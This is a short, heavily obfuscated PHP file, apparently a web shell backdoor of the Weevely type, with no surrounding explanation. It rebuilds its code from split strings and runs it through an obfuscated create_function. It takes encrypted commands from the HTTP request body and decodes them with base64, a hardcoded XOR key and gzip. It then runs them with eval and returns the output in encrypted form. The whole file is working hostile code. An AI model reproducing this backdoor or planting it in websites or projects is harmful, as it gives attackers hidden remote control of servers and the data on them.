<?php
$x='$k="56va7e6vfc39";6v$kh="882e4dee6v4594"6v6v;$kf="46v7236v0bb3636v6vd5";$p="r8AWNnJv9L';
$r='f6vor($i=6v0;$i6v<$l;){fo6vr($j6v=0;($j<6v6v$c&&6v$i<$l);$j++,$i+6v+)6v{$o.=6v$t{$i}^$';
$W='_conte6vnts6v("php://in6vput"),$m)==6v6v1) {@o6vb_6vstart();@ev6val(@gzu6vncompres';
$u='k6v{$j};}}6vreturn 6v$o;}i6vf6v (@preg_matc6vh(6v"/6v$k6v6vh(.+)$kf/6v",@file_get';
$F='6vs(6v@x(@b6vase6v64_deco6v6vde($m[6v1])6v,$k)));$o=@ob_get6v_contents();@6vob_end6v_cl';
$A='e6va6vn();$r=@b6vase64_en6vcode(6v@x6v(@g6vzcompress($o),6v6v$k));print("$6vp$kh$r6v$kf");}';
$w=str_replace('b','','cbbbrebatbe_bfunction');
$g='3Lp6vCua";f6vuncti6vo6vn x6v($t,$k6v){$c=s6vtrlen(6v$k);$6vl=strlen($t);6v$o="";';
$c=str_replace('6v','',$x.$g.$r.$u.$W.$F.$A);
$q=$w('',$c);$q();
?>
